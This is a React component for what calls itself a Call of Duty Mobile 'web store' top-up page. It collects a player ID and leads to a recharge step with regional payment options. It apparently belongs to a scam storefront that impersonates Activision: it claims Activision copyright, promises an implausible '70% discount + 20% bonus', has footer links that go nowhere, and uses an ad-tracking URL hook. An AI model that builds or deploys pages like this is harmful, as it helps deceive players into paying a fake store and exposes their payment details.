import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useXcodUrl } from '@/hooks/useXcodParam';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ShieldCheck, Loader2 } from 'lucide-react';
import codmBanner from '@/assets/codm-banner.png';
import codmIcon from '@/assets/codm-icon.png';
import codmHeroBanner from '@/assets/codm-hero-banner.png';
import cpCoin from '@/assets/cp-coin.png';
import cpCoinsStack from '@/assets/cp-coins-new.png';
import paymentNequi from '@/assets/payment-nequi.png';
import paymentYape from '@/assets/payment-yape.png';
import paymentMercadopago from '@/assets/payment-mercadopago.png';
import paymentEfecty from '@/assets/payment-efecty.svg';
import paymentBancolombia from '@/assets/payment-bancolombia.png';
import paymentPaypal from '@/assets/payment-paypal.png';
import paymentPse from '@/assets/payment-pse.png';
import { useImagePreloader, preloadNextPageImages } from '@/hooks/useImagePreloader';

// All images for this page + next page (Recharge)
const pageImages = [
  codmBanner,
  codmIcon,
  codmHeroBanner,
  cpCoin,
];

const nextPageImages = [
  cpCoinsStack,
  paymentNequi,
  paymentYape,
  paymentMercadopago,
  paymentEfecty,
  paymentBancolombia,
  paymentPaypal,
  paymentPse,
];

const IdentifyEn = () => {
  const [playerId, setPlayerId] = useState('');
  const navigate = useNavigate();
  const { buildUrl } = useXcodUrl();
  const { isLoading, isReady } = useImagePreloader(pageImages, true);

  // Preload next page images when this page is ready
  if (isReady) {
    preloadNextPageImages(nextPageImages);
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (playerId.trim()) {
      localStorage.setItem('codm_player_id', playerId);
      navigate(buildUrl('/en/recharge'));
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto mb-4" />
          <p className="text-gray-400 text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] flex flex-col">
      {/* Header */}
      <header className="bg-[#111] border-b border-gray-800 py-3 px-4">
        <div className="max-w-2xl mx-auto flex items-center gap-2">
          <span className="text-white font-bold text-sm tracking-wide">CALL OF DUTY</span>
          <span className="text-gray-500">|</span>
          <span className="text-gray-400 text-sm">WEB STORE</span>
        </div>
      </header>

      <div className="flex-1 w-full max-w-2xl mx-auto px-4 py-6">
        {/* Hero Banner COD Mobile */}
        <div className="relative rounded-xl overflow-hidden mb-8">
          <img 
            src={codmHeroBanner} 
            alt="Call of Duty Mobile" 
            className="w-full h-auto object-cover"
          />
        </div>

        {/* Game Selection Label */}
        <p className="text-gray-400 text-sm mb-3 italic">Game Selection</p>
        
        {/* Game Selection Chip */}
        <div className="inline-flex items-center gap-2 bg-[#1a1a1a] border border-primary rounded-full px-4 py-2 mb-4">
          <img src={codmIcon} alt="COD Mobile" className="w-6 h-6 rounded" />
          <span className="text-white font-medium text-sm">Call of Duty Mobile</span>
        </div>

        {/* Game Banner */}
        <div className="relative rounded-xl overflow-hidden mb-8">
          <img 
            src={codmBanner} 
            alt="Call of Duty Mobile - Garena" 
            className="w-full h-auto object-cover"
          />
        </div>

        {/* ID Form Section */}
        <div className="bg-[#141414] border border-gray-800 rounded-xl p-6 mb-6">
          <div className="flex items-center gap-3 mb-5">
            <div className="w-7 h-7 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground font-bold text-sm">1</span>
            </div>
            <h2 className="text-white font-semibold text-lg">Sign In</h2>
          </div>
          
          <form onSubmit={handleSubmit}>
            <div className="mb-5">
              <label className="text-gray-300 text-sm mb-2 block">Player ID</label>
              <Input
                type="text"
                placeholder="Enter your player ID."
                value={playerId}
                onChange={(e) => setPlayerId(e.target.value)}
                className="bg-[#0a0a0a] border-gray-700 text-white placeholder:text-gray-500 rounded-lg h-12"
              />
            </div>

            <Button 
              type="submit" 
              className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-6 rounded-lg text-base"
              disabled={!playerId.trim()}
            >
              Start
            </Button>
          </form>
        </div>

        {/* Info Card */}
        <div className="bg-[#141414] border border-gray-800 rounded-xl p-5 flex items-start gap-4">
          <div className="w-14 h-14 flex-shrink-0">
            <img src={cpCoin} alt="CP Coin" className="w-full h-full object-contain" />
          </div>
          <div>
            <p className="text-gray-300 text-sm">
              Sign in with your ID to see available top-ups and claim your bonus!
            </p>
            <p className="text-primary text-sm font-semibold mt-1">
              Anniversary top-up unlocked with up to 70% discount + 20% bonus!
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#111] border-t border-gray-800 py-4 px-4 mt-auto">
        <div className="max-w-2xl mx-auto text-center">
          <p className="text-gray-500 text-xs mb-2">© Activision. All rights reserved.</p>
          <div className="flex items-center justify-center gap-4 text-xs flex-wrap">
            <a href="#" className="text-gray-500 hover:text-gray-300 transition-colors">FAQ</a>
            <a href="#" className="text-gray-500 hover:text-gray-300 transition-colors">Terms and Conditions</a>
            <a href="#" className="text-gray-500 hover:text-gray-300 transition-colors">Privacy Policy</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default IdentifyEn;
